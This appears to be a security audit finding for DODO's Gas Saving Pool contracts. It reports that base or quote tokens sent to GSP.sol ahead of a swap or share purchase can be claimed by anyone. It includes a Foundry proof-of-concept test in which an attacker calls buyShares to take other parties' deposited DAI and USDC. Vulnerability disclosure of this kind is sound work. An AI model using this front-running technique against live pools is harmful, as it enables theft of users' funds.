Melodic Cobalt Platypus

high

# Anyone can steal the base/quote token that is sent to `GSP.sol`

## Summary
If a user transfers base/quote tokens to swap on `GSPTrader.sol::sellBase()`, `GSPTrader.sol::sellQuote()` or `GPSFuding.sol::buyShares()`. Once the transfer is made, anyone can steal the assets sent.

## Vulnerability Detail

The vulnerability is detected in three specific functions: `GSPTrader.sol::sellBase(`), `GSPTrader.sol::sellQuote()`, and `GPSFuding.sol::buyShares()` and occurs when a user wants to buy some shares or make swap for its token.

1. A user sends tokens (base or quote) to the contract.
2. Due to the absence of a tracking mechanism for these deposits, any third party can claim these tokens.
3. The attacker can then sell these tokens or use them to buy shares, subsequently selling these shares for tokens.

When this happens, ownership of the token passes to the malicious actor. As a result, the malicious actor can sell any of these tokens and send them to his wallet or exchange them for shares and then, if he wishes, sell this share and receive the corresponding amount of tokens. Therefore, the user loses everything.

### PoC 

To replicate this vulnerability, use the same testing environment as the DODO team. Run the following script with `forge test --mt getShare --fork-url $ETH_RPC_URL -vvv` .

This script demonstrates the sequence of events post-user transfer, culminating in the attacker buying shares with the transferred amount.

```solidity 
// SPDX-License-Identifier: MIT 

pragma solidity 0.8.16;
import "forge-std/console.sol";
import { Test } from "forge-std/Test.sol";
import { DeployGSP } from "../scripts/DeployGSP.s.sol";
import { GSP } from "../contracts/GasSavingPool/impl/GSP.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract GetShare is Test {
    GSP gsp;

    address DODO_TEAM = vm.addr(1);
    address USER = vm.addr(2);
    address ATTACKER = vm.addr(777);
    address constant USDC_WHALE = 0x51eDF02152EBfb338e03E30d65C15fBf06cc9ECC;
    address constant DAI_WHALE = 0x25B313158Ce11080524DcA0fD01141EeD5f94b81;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    IERC20 private usdc = IERC20(USDC);
    IERC20 private dai = IERC20(DAI);

    // Test Params
    uint256 constant BASE_RESERVE = 1e19; // 10 DAI
    uint256 constant QUOTE_RESERVE = 1e7; // 10 USDC
    uint256 constant BASE_INPUT = 1e18; // 1 DAI
    uint256 constant QUOTE_INPUT = 2e6; // 2 USDC 


    function setUp() public {
        // Create and deploy GSP.sol
        DeployGSP deployGSP = new DeployGSP();
        gsp = deployGSP.run();

        // Transfer amoutn of DAI and USDC to DODO_TEAM
        vm.startPrank(DAI_WHALE);
        dai.transfer(DODO_TEAM, BASE_RESERVE);
        vm.stopPrank();

        vm.startPrank(USDC_WHALE);
        usdc.transfer(DODO_TEAM,QUOTE_RESERVE);
        vm.stopPrank();

        // Transfer amoutn of DAI and USDC to USER
        vm.startPrank(DAI_WHALE);
        dai.transfer(USER, BASE_INPUT);
        vm.stopPrank();

        vm.startPrank(USDC_WHALE);
        usdc.transfer(USER,QUOTE_INPUT);
        vm.stopPrank();
    }


    function test_getShareFromTheUser() public { 
        console.log("---------------------------------------------");
        console.log("Before the attack");
        console.log("---------------------------------------------");
        console.log("Attacker share balance: ", gsp.balanceOf(ATTACKER));
        console.log("Attacker USDC balance: ", usdc.balanceOf(ATTACKER));
        console.log("Attacker DAI balance: ", dai.balanceOf(ATTACKER));
        console.log("DODO TEAM share balance: ", gsp.balanceOf(DODO_TEAM));
        console.log("DODO TEAM USDC balance: ", usdc.balanceOf(DODO_TEAM));
        console.log("DODO TEAM DAI balance: ", dai.balanceOf(DODO_TEAM));
        console.log("USER share balance: ", gsp.balanceOf(USER));
        console.log("USER USDC balance: ", usdc.balanceOf(USER));
        console.log("USER DAI balance: ", dai.balanceOf(USER));


        // DODO TEAM made a transfer 
        vm.startPrank(DODO_TEAM);
        dai.transfer(address(gsp), BASE_RESERVE);
        usdc.transfer(address(gsp), QUOTE_RESERVE);
        vm.stopPrank();
        // Attacker stole the funds
        vm.startPrank(ATTACKER);
        gsp.buyShares(ATTACKER);
        assertTrue(gsp._BASE_RESERVE_() == BASE_RESERVE);
        assertTrue(gsp._QUOTE_RESERVE_() == QUOTE_RESERVE);
        vm.stopPrank();

       // User a transfer 
        vm.startPrank(USER);
        dai.transfer(address(gsp), BASE_INPUT);
        usdc.transfer(address(gsp), QUOTE_INPUT);
        vm.stopPrank();
        // Attacker stole the funds again
        vm.startPrank(ATTACKER);
        gsp.buyShares(ATTACKER);
        vm.stopPrank();
        console.log("---------------------------------------------");
        console.log("After the attack");
        console.log("---------------------------------------------");
        console.log("Attacker share balance: ", gsp.balanceOf(ATTACKER));
        console.log("Attacker USDC balance: ", usdc.balanceOf(ATTACKER));
        console.log("Attacker DAI balance: ", dai.balanceOf(ATTACKER));
        console.log("DODO TEAM share balance: ", gsp.balanceOf(DODO_TEAM));
        console.log("DODO TEAM USDC balance: ", usdc.balanceOf(DODO_TEAM));
        console.log("DODO TEAM DAI balance: ", dai.balanceOf(DODO_TEAM));
        console.log("USER share balance: ", gsp.balanceOf(USER));
        console.log("USER USDC balance: ", usdc.balanceOf(USER));
        console.log("USER DAI balance: ", dai.balanceOf(USER));
    }
}
```

## Impact
The impact of this vulnerability is high. Users are at risk of losing their deposited funds entirely.

## Code Snippet
The affected code sections can be viewed at the following GitHub links:
* [GSPTrader.sol#L40](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L40)
* [GSPTrader.sol#L79](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPTrader.sol#L79)
* [GSPFunding.sol#L31](https://github.com/sherlock-audit/2023-12-dodo-gsp/blob/main/dodo-gassaving-pool/contracts/GasSavingPool/impl/GSPFunding.sol#L31)

## Tool used

* Manual Review
* Foundry

## Recommendation

To mitigate this risk, it is essential to implement a robust deposit tracking system. This system should ensure that only users who have made prior deposits can execute trades or buy shares.